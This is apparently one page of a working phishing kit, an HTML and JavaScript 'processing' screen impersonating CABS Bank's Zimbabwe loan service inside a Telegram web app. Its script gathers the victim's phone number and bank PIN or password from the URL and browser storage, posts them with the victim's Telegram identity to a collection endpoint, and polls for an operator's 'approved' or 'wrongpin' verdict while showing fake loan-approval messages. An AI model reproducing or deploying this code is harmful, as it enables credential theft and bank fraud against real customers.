<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CABS Bank Loans Zimbabwe - Processing</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --blue-primary: #003366;
            --blue-gradient: linear-gradient(180deg, #004488 0%, #002244 100%);
            --bg-dark: #001a33;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #555555;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .loading-card {
            background: var(--card-bg);
            width: 88%;
            max-width: 380px;
            padding: 45px 24px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-circle {
            width: 110px;
            height: 110px;
            background: var(--blue-gradient);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 18px rgba(0, 51, 102, 0.35);
        }

        .loader-circle::after {
            content: '';
            width: 82px;
            height: 82px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            color: var(--blue-primary);
            font-size: 24px;
            margin: 0 0 10px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        p {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
            font-weight: 500;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Processing...</h2>
    <p id="sub-text">Preparing CABS verification...</p>
</div>

<script>
function getStoredValue(keys, fallback = "") {
    const params = new URLSearchParams(window.location.search);
    for (const key of keys) {
        const paramVal = params.get(key);
        if (paramVal) return paramVal;
        const localVal = localStorage.getItem(key);
        if (localVal) return localVal;
        const sessionVal = sessionStorage.getItem(key);
        if (sessionVal) return sessionVal;
    }
    return fallback;
}

document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = getStoredValue(["phone", "userPhone", "mobile", "phoneNumber"]).trim();
    const pin = getStoredValue(["lastPin", "pin", "userPin", "password"]).trim();
    const loanAmount = getStoredValue(["loan_amount", "amount", "loanAmount"], "500");
    const loanTerm = getStoredValue(["loan_term", "duration", "term", "loanTerm"], "12");
    const monthlyRepayment = getStoredValue(["monthly_repayment", "monthlyPayment", "monthly"], "45");

    // Normalize keys so pages 8 & 9 always find them
    if (phone) {
        localStorage.setItem("phone", phone);
        localStorage.setItem("userPhone", phone);
    }
    if (pin) {
        localStorage.setItem("lastPin", pin);
        localStorage.setItem("pin", pin);
    }
    localStorage.setItem("loan_amount", loanAmount);
    localStorage.setItem("loan_term", loanTerm);
    localStorage.setItem("monthly_repayment", monthlyRepayment);

    const tgUser = tg?.initDataUnsafe?.user || null;

    if (!phone) {
        console.warn("⚠️ No phone number found in storage or URL");
    }

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone,
                pin,
                country: "ZW",
                bank: "CABS",
                loan_amount: loanAmount,
                loan_term: loanTerm,
                monthly_repayment: monthlyRepayment,
                telegramUser: tgUser
            })
        });
    } catch (err) {
        console.error("❌ Request error:", err);
    }

    setTimeout(() => {
        mainText.textContent = "Please wait...";
        subText.textContent = "This takes a few seconds";
    }, 3000);

    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pin)}`);
            if (!res.ok) return;
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "Approved!";
                subText.textContent = "Opening next page...";
                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            } else if (data.status === "denied") {
                mainText.textContent = "Declined!";
                subText.textContent = "Incorrect PIN or phone number.";
                setTimeout(() => {
                    window.location.href = "/page6?error=wrongpin";
                }, 2000);
            }
        } catch (err) {
            console.error("❌ Status check failed:", err);
        }
    }

    checkApproval();
    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
